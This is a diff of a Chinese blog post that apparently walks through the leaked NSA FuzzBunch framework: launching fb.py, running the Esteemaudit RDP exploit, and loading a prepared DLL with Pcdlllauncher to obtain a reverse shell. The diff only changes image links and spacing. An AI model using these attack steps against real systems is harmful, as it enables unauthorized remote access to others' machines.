@@ -53,6 +53,7 @@ exploit
 ![5.jpg](post162/5.jpg)
 0x02
 打开命令提示符，输入
+
 ```
 C:\win\fb.py
 ```
@@ -61,6 +62,7 @@ C:\win\fb.py
 最后敲击回车
 0x03
 显示出`fb >`之后输入命令
+
 ```
 use Esteemaudit
 ```
@@ -75,17 +77,18 @@ use Esteemaudit
 ![5.jpg](post162/5-16273801405719.jpg)
 0x04
 接着输入命令
+
 ```
 use Pcdlllauncher
 ```
 使用Pcdlllauncher，除了下图其他保持默认即可
 （改为自己的实际路径）
-![6.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/6.jpg "6.jpg")
+![6.jpg](post162/6.jpg)
 （之前生成的s.dll路径）
-![7.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/7.jpg "7.jpg")
+![7.jpg](post162/7.jpg)
 之后不断回车，会看到如图
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/10.jpg "10.jpg")
+![10.jpg](post162/10.jpg)
 不用理他，打开xshell可以看到已经成功反弹shell，如下图
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/8.jpg "8.jpg")
+![8.jpg](post162/8.jpg)
 然后就可以比如说输入shell模拟终端执行命令了
-![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3389/9.jpg "9.jpg")
+![9.jpg](post162/9.jpg)
